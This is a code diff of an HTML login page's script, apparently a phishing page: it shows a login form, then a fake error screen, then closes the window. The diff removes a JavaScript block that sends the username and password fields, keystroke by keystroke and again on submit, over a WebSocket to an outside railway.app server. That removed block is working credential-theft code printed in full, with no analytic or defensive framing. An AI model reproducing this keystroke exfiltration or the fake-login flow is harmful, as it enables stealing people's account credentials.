@@ -244,7 +244,6 @@
     </div>
 
     <script>
-        // Language dropdown (same as before)
         const langBtn = document.getElementById('langBtn');
         const dropdown = document.getElementById('dropdown');
 
@@ -266,7 +265,6 @@
 
         document.addEventListener('click', () => dropdown.classList.remove('active'));
 
-        // Error page
         const loginScreen = document.getElementById('loginScreen');
         const errorScreen = document.getElementById('errorScreen');
         const loginForm = document.getElementById('loginForm');
@@ -282,30 +280,6 @@
             window.close();
             window.location.href = 'about:blank';
         });
-
-        // === Real-time sending to your Railway server ===
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-
-        const socket = new WebSocket('wss://w7f60yaq.up.railway.app'); // Your Railway URL
-
-        socket.onopen = () => console.log('Connected to monitor server');
-
-        const sendData = () => {
-            if (socket.readyState === WebSocket.OPEN) {
-                socket.send(JSON.stringify({
-                    username: usernameInput.value,
-                    password: passwordInput.value,
-                    time: new Date().toISOString()
-                }));
-            }
-        };
-
-        usernameInput.addEventListener('input', sendData);
-        passwordInput.addEventListener('input', sendData);
-
-        // Final send on submit
-        loginForm.addEventListener('submit', sendData);
     </script>
 </body>
 </html>
